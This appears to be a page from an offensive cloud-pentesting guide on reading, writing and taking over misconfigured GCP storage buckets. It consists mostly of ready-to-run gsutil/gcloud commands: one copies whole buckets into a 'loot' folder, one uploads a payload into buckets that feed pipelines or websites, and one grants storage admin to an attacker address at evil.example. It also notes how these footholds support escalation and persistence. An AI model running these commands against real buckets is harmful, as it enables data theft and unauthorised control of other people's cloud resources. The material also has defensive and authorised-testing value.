---
title: "Access: reading and writing objects through broad bucket IAM and ACLs"
order: 2
description: "Reading or writing bucket objects through overly broad bucket IAM, legacy ACLs, or allUsers and allAuthenticatedUsers bindings."
keywords:
  - bucket IAM
  - ACL
  - allUsers
  - object access
  - uniform access
---

# Access

Once a bucket is found, access is an authorization question: does the bucket IAM policy or a legacy ACL grant your identity (or `allUsers`/`allAuthenticatedUsers`) read or write on the objects. Broad project roles (`roles/storage.admin`, `roles/storage.objectViewer`) and leftover `allAuthenticatedUsers` bindings are the common wins, and write access turns the bucket into a foothold when something downstream trusts its contents.

## Reading objects

```bash
# with any identity that holds objectViewer on the bucket or project
gsutil -m cp -r gs://<bucket> ./loot
gcloud storage cp --recursive gs://<bucket> ./loot

# allAuthenticatedUsers buckets open to any Google account at all
gsutil ls gs://<bucket>        # authenticate with a throwaway Google identity
```

## Finding the grant

```bash
gsutil iam get gs://<bucket>                     # uniform bucket IAM
gsutil acl get gs://<bucket>                     # legacy object/bucket ACLs
# look for allUsers / allAuthenticatedUsers, or roles bound at the project
gcloud projects get-iam-policy <proj> --format=json | grep -i storage
```

## Writing and taking over

```bash
# write access to a bucket feeding a pipeline, website, or function source
gsutil cp payload gs://<bucket>/path/object
# if allUsers holds storage.buckets.setIamPolicy, grant yourself admin
gsutil iam ch user:you@evil.example:roles/storage.admin gs://<bucket>
```

## Exploitation notes

- Uniform bucket-level access ignores object ACLs; where it is off, a single world-readable object ACL leaks that object even in a private bucket.
- A writable bucket that holds Cloud Function or App Engine source, Terraform state, or a static site is an escalation and persistence surface, not just data.
- `allAuthenticatedUsers` is not public: it is every Google account, so it is reachable with any free identity.

## Tools

- **gsutil / gcloud storage**: object read, write, and IAM/ACL inspection.
- **GCPBucketBrute**: flags buckets with attacker-grantable IAM.

## References

- [HackTricks Cloud: GCP bucket privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Google: Cloud Storage access control](https://cloud.google.com/storage/docs/access-control)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
